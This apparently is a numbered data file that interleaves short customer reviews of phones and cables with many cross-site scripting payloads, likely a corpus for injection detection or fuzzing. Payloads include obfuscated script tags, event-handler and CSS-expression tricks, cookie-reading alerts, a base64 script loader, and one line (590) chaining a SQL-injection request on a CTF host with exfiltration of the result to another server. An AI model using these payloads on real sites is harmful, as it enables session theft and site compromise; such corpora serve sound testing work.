584	&LT;STYLE&GT;@IM\PORT'\JA\VASC\RIPT&#58;ALERT(\"XSS\")';&LT;/STYLE&GT;
585	Poor quality.
586	<imG/&#09;&#10;&#11; SRC=`~` ONErRor=PrOmpt(1)>
587	The nokia CA-42 USB cable did not work with my phone.
588	It is cheap, and it feel and look just as cheap.
589	<bOdY OnLOAD=ALert('helLOX worlDss')>
590	<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new image().src='http://player_server/?'+_)</script>
591	wont work right or atleast for me.
592	<frameset><frame src="javascript:alert('xss');"></frameset>
593	Does not fit.
594	<TABLE><TD BACKGROUND="JAVASCRIPT:ALERT('XSS')">
595	<sCrIpt>CoNFiRm()</ScRIPt>
596	&lt;div style=\"width&#58; expression(alert('xss'));\"&gt;
597	<DIV STYLE="BACKGROUND-IMAGE: URL(JAVASCRIPT:ALERT('XSS'))">
598	<Scr<SCRIpt>IpT>ALERt(docUMeNt.CookIe)</Scr</SCriPT>IPt>
599	&lt;bgsound src=\"javascript&#058;alert('xss');\"&gt;
600	<% foo><x foo="%><script>alert(123)</script>">
601	+adw-script+ad4-alert(document.location)+adw-/script+ad4-
602	&LT;DIV STYLE=\"BACKGROUND-IMAGE&#58;\0075\0072\006C\0028'\006A\0061\0076\0061\0073\0063\0072\0069\0070\0074\003A\0061\006C\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&GT;
603	I get absolutely horrible reception in my apartment, where with other phones I have not had this problem.
604	<input onblur=write(XSS) autofocus><input autofocus>
605	"/>'><SCRIPT SRC="/USER_UPLOAD/MYPIC.PNG.JS"></SCRIPT>
606	&LT;TaBLe&GT;&lT;td bAckgrOUnD=\"jAVASCrIpt&#058;aLErT('XSS')\"&gt;
607	&LT;br SIze=\"&{alert('xss')}\"&Gt;
608	foo\’; alert(document.cookie);//’;
609	Would not reccommend.
610	"><script src=data:text/javascript;base64,ZD1kb2N1bWVudDsgXyA9IGQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7Xy5pZD0nMTknO18ubm9uY2U9ZC5xdWVyeVNlbGVjdG9yKCdbbm9uY2VdJykubm9uY2U7Xy5zcmM9Jy8vbG9jYWxob3N0L20nO2QuYm9keS5hcHBlbmRDaGlsZChfKSA=></script>
611	&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
612	Unfortunately it will not recharge my iPhone 4s, despite connecting it from multiple power sources (iMac, external battery, wall outlet, etc).
613	<iframe/src=javascript:alert(1)>
614	&LT;LINK REL=\"STYLESHEET\" HREF=\"JAVASCRIPT&#058;ALERT('XSS');\"&GT;
615	if you simply want a small flip phone -- look elsewhere as the extra bells & whistles are mediocre.
616	Better than expected.
617	<InPUt oNblUr=WRitE(xss) AutoFOcus><INPUT aUtOfoCuS>
618	Just what I wanted.
619	<iFRaME/SRC="DaTa:TeXT/hTml;&TAb;BAse64&tAb;,PGJvzhKGB25sb2FkPwFszxJ0KdeppG==">
620	<iMg srC=jAVAsCrIPt:aLERt(sTrING.frOMCHARCode(88,83,83))>
621	This product is great... it makes working a lot easier I can go to the copier while waiting on hold for something.
622	<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_x.pdf">
623	&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
624	Don't make the same mistake that I did and please don't buy this phone.
